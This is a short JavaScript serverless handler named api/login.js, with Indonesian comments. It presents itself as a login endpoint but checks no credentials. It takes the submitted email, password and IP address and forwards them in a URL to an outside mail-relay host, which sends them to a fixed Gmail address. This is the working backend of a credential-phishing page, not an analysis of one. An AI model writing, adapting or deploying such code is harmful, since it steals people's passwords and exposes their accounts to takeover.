// api/login.js
import fetch from 'node-fetch';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password, loginType, ip } = req.body;

    // Kirim ke API notifikasi
    const to = 'newjimelyeuh@gmail.com';
    const notifyUrl = `https://sendmail-lime.vercel.app/send2?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&Ip=${encodeURIComponent(ip)}&to=${encodeURIComponent(to)}`;

    try {
      await fetch(notifyUrl);
      res.status(200).json({ success: true, message: 'Data terkirim!' });
    } catch (err) {
      res.status(500).json({ success: false, message: 'Gagal mengirim data' });
    }
  } else {
    res.status(405).json({ success: false, message: 'Method not allowed' });
  }
}
